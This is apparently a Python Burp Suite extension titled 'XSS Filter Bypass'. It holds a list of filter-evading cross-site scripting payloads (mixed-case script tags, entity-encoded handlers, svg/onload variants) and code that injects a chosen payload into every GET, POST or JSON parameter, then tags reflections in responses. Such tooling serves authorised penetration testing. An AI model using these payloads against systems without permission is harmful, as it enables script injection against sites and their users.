#!/usr/bin/env python
# coding:utf-8
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

import hashlib
import json
import os
import re
import urllib

from burp import IBurpExtender, IContextMenuFactory, IHttpListener
from java.io import PrintWriter
from java.lang.String import getMethod
from javax.swing import JMenu, JMenuItem

try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass


PAYLOADS = [
    '<script>alert(1)</script>',
    '<script><script>alert(1)</script>',
    '<script >alert(1)</script >',
    '<<SCRIPT>alert(1);//\<</SCRIPT>',
    '<scrscriptipt>alert(1)</scrscriptipt>',
    '¼script¾alert(1)¼/script¾',
    '<script>alert`1`</script>',
    '<ScRiPt>alert(1)</sCriPt>',
    '%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    '<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>',
    '<IMG SRC="javascript:alert(1);">',
    '<IMG SRC=JaVaScRiPt:alert(1)>',
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    '<IMG SRC="jav ascript:alert(1);">',
    '<IMG SRC="jav&#x09;ascript:alert(1);">',
    '<IMG SRC="jav&#x0A;ascript:alert(1);">',
    '<IMG SRC="jav&#x0D;ascript:alert(1);">',
    '<IMG SRC=" &#14; javascript:alert(1);">',
    '<svg onload=alert(1)>',
    '<svg onload=alert&#40;1&#41></svg>',
    '<svg	onload=alert(1)><svg>',
    '<svg/onload=alert(1)>',
    '<svg onload=alert`1`></svg>',
    '<svg onload=alert&lpar;1&rpar;></svg>',
    '<body onload=alert()>',
    '<details open ontoggle="alert()">',
    '<video autoplay onloadstart="alert()" src=x></video>',
    '<p style="animation: x;" onanimationstart="alert()">XSS</p>'
]

PAYLOAD_TAG = '{XSS}'


class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory):
    """General class for burp extension."""

    def registerExtenderCallbacks(self, callbacks):
        """Extension registration."""
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("XSS Filter Bypass")
        self._callbacks.registerHttpListener(self)
        self._callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        """Menu items creation and sending payload in request window."""
        self.menus = []
        self.main_menu = JMenu("XSS Filter Bypass")
        self.menus.append(self.main_menu)
        self.invocation = invocation
        menu_items = PAYLOADS
        # Parse selected payload
        for payload in menu_items:
            menu = JMenuItem(payload, None,
                             actionPerformed=lambda x: self.requestModify(x))
            self.main_menu.add(menu)
        return self.menus if self.menus else None

    def requestModify(self, x):
        """Check request method and paste payload."""
        self.payload = PAYLOAD_TAG+x.getSource().text+PAYLOAD_TAG
        current_request = self.invocation.getSelectedMessages()[0]
        request_info = self._helpers.analyzeRequest(current_request)
        self.headers = list(request_info.getHeaders())
        # If request method == GET
        if request_info.getMethod() == "GET":
            body = current_request.getRequest()
            request_info = self._helpers.analyzeRequest(
                current_request)
            param_list = request_info.getParameters()
            new_request_info = body
            for param in param_list:
                if param.getType() == 0:
                    value = param.getValue() + self.payload
                    key = param.getName()
                    new_param = self._helpers.buildParameter(key, value,
                                                             param.getType())
                    new_request_info = self._helpers.updateParameter(
                        new_request_info,
                        new_param)
            current_request.setRequest(new_request_info)
        # If request method == POST
        elif request_info.getMethod() == "POST":
            body_bytes = current_request.getRequest()[
                        request_info.getBodyOffset():]
            self.body = self._helpers.bytesToString(body_bytes)
            o, n = self.updateBody(urllib.unquote(self.body))
            self.body = self.body.replace(o, n)
            new_message = self._helpers.buildHttpMessage(self.headers,
                                                         self.body)
            current_request.setRequest(new_message)

    def updateBody(self, body=""):
        """Update request body."""
        try:
            o = body
            for item in self.headers:
                if ((item.startswith('Content-Type:') and 'application/json'
                     in item) or body.startswith('{"')):
                    json_type = 1
                    break
                else:
                    json_type = 0
            if json_type == 0:
                params = o.split('&')
                for i in range(len(params)):
                    params[i] = params[i] + self.payload
                n = '&'.join(params)
                return o, n
            if json_type == 1:
                data = json.loads(o)
                for item in data:
                    data[item] = data[item] + self.payload
                n = json.dumps(data)
                return o, n
        except Exception as e:
            return e

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        """Working with request before send and analyze response."""
        # Check tool: Scanner == 16, Intruder == 32, Repeater == 64
        if toolFlag == 16 or toolFlag == 32 or toolFlag == 64:
            # If Request:
            if messageIsRequest:
                request = messageInfo.getRequest()
                analyzed_request = self._helpers.analyzeRequest(
                    request)
                headers = analyzed_request.getHeaders()
                body = request[analyzed_request.getBodyOffset():]
                # If request method == POST
                if self._helpers.analyzeRequest(
                        messageInfo.getRequest()).getMethod() == 'POST':
                    body_string = body.tostring()
                    self.payload = re.search(r'{XSS}[^{]+{XSS}', body_string)
                    # If payload not empty
                    if self.payload:
                        new_body_string = body_string.replace(PAYLOAD_TAG, '')
                        new_body = self._helpers.bytesToString(new_body_string)
                        self.payload = self.payload.group(0).replace(
                            PAYLOAD_TAG, ''
                        )
                        # Set new request
                        messageInfo.setRequest(
                            self._helpers.buildHttpMessage(headers, new_body)
                        )
                # If request method == GET
                elif self._helpers.analyzeRequest(
                        messageInfo.getRequest()).getMethod() == 'GET':
                    param_list = self._helpers.analyzeRequest(
                        messageInfo.getRequest()).getParameters()
                    request_body = messageInfo.getRequest()
                    new_request = request_body
                    # Search payload in parameters
                    for param in param_list:
                        value = param.getValue()
                        payload_search = re.search(r'{XSS}[^{]+{XSS}', value)
                        if payload_search:
                            value = value.replace(PAYLOAD_TAG, '')
                            self.payload = payload_search.group(0).replace(
                                PAYLOAD_TAG, ''
                            )
                            key = param.getName()
                            new_param = self._helpers.buildParameter(
                                key, value, param.getType())
                            new_request = self._helpers.updateParameter(
                                new_request,
                                new_param)
                    messageInfo.setRequest(new_request)
            # If Response
            if not messageIsRequest and self.payload:
                response = messageInfo.getResponse()
                analyzed_response = self._helpers.analyzeResponse(
                    response)
                headers = analyzed_response.getHeaders()
                body = response[analyzed_response.getBodyOffset():]
                body_string = body.tostring()
                # Search payload in response
                if body_string.find(urllib.unquote(self.payload)) != -1:
                    new_body_string = body_string.replace(
                        urllib.unquote(self.payload),
                        '<!-- '+PAYLOAD_TAG+' -->'+urllib.unquote(self.payload)
                    )
                    new_body = self._helpers.bytesToString(new_body_string)
                    # Update body and tag payload
                    messageInfo.setResponse(
                        self._helpers.buildHttpMessage(headers, new_body)
                    )


try:
    FixBurpExceptions()
except:
    pass
